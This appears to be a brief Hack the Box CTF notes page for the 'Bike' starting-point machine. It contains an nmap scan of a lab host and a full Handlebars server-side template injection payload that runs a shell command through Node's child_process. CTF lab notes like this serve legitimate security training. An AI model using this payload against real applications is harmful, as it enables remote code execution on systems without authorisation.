Hack the Box
starting point

Bike

10.129.97.64

┌──(kali㉿kali)-[~/…/CTF/HTB/starting_point/bike]
└─$ nmap -sV -sC --min-rate 1000 --max-retries 2 -oN nmap/bike 10.129.97.64
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 23:57 EDT
Nmap scan report for 10.129.97.64
Host is up (0.082s latency).
Not shown: 998 closed tcp ports (conn-refused)cd 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title:  Bike 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds

{{#with "s" as |string|}}
 {{#with "e"}}
 {{#with split as |conslist|}}
 {{this.pop}}
 {{this.push (lookup string.sub "constructor")}}
 {{this.pop}}
 {{#with string.split as |codelist|}}
 {{this.pop}}
 {{this.push "return require('child_process').exec('whoami');"}}
 {{this.pop}}
 {{#each conslist}}
 {{#with (string.sub.apply 0 codelist)}}
 {{this}}
 {{/with}}
 {{/each}}
 {{/with}}
 {{/with}}
 {{/with}}
{{/with}}

